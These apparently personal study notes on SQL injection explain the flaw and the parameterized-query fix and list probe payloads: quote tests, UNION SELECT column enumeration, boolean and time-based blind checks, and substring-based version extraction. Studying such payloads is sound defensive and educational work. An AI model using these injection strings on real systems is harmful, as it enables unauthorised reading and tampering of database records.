# SQL Injection
- SQL stands for Structured Query Language
- It is a language used to communicate with relational databases.
- Almost every single applicaation that stores persistent data will utilise SQL in some way.
- Follows a standard with different database management systems(DBMS) implementing their own features/variations.

## Injection
An SQL Injection vulnerability allows an attacker to potentially execute mailicious queries. This could allow them to create, read, update and delete records in a database.

Separater user input data from SQL query logic. User prepared statements(aka parameterized queries) to allow the DBMS to distinguish between code and data.

> db.query('SELECT id FROM my_table WHERE id=' + request.query\['id'\])

> query=db.prepare('SELECT id FROM my_table WHERE id=:id')
> query.execute({id:request.query\['id'\]})

## Types
Two major types of SQL injections:
- Error based 
- Blind

## Error Based
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "\" at line 1.

| Request              | Response |
| -------------------- | -------- |
| example.com/?id=''   | Error?   |
| example.com/?id=""   | Error?   |
| example.com/?id=\`\  | Erro?    |
| example.cm/?id\[\]=) | Error?   |


| Request                        | Query                                                                                                                                                    |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /app/news.php?id=1             | SELECT articles.id AS article_id, users.username, users.iban FROM articles INNER JOIN users ON articles.u_id=users.id WHERE articles.u_id='1'            |
| /app/news.php?id=1'            | SELECT articles.id AS article_id, users.username, users.iban FROM articles INNER JOIN users ON articles.u_id=users.id WHERE articles.u_id='1"            |
| /app/news/php?id=1'+AND+1=1--+ | SELECT articles.id AS article_id, users.username, users.iban FROM articles INNER JOIN users ON articles.u_id=users.id WHERE articles.u_id='1' AND 1=1--' |

> /app/news/php?id=1'+UNION+SELECT+1,2,3--+ returns some data depending on the number of columns.

The next thing we wanna do after getting an idea of how many columns there are, is that we're going to guess the column names in order to get them printed.


## Blind SQLi
In many SQL dialects '--' (without the quote) is used for writing comments. Everything after the -- is ignored.

| Request          | Response                               |
| ---------------- | -------------------------------------- |
| ?id=1" AND 1=1-- | True condition -> Response received?   |
| ?id=1" AND 1=1-- | True condition -> Response received?   |
| ?id=1" AND 1=2-- | Invalid condition -> Invalid Response? |


### Time based

| Request                    | Response          |
| -------------------------- | ----------------- |
| 1' AND sleep(5)--          | Is there a delay? |
| ': WAITFOR DELAY '0:0:5'-- | Is there a delay? |


## How does it work?

| Request                                       | Explanation                                                                                                                                                                                                  |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| ?id=1'(IF TRUE/VALID STATEMENT) THEN SLEEP(5) | If my expression/condition is true then delay for 5 seconds otherwise do nothing                                                                                                                             |
| SELECT SUBSTRING(String, Start, Value)        | We can use substring to blindly check the value for the data we are extracting.<br> SUBSTRING("NahamSec", 1, 1) => N<br> SELECT SUBSTRING("NahamSec", 2, 1) => A<br> SELECT SUBSTRING("NahamSec", 1, 2)=> NA |
| ?id=1' AND substring(@@version, 1, 1)=5       | If true, we'll receive no error and we know the app is running MySQL Version 5.x                                                                                                                             |
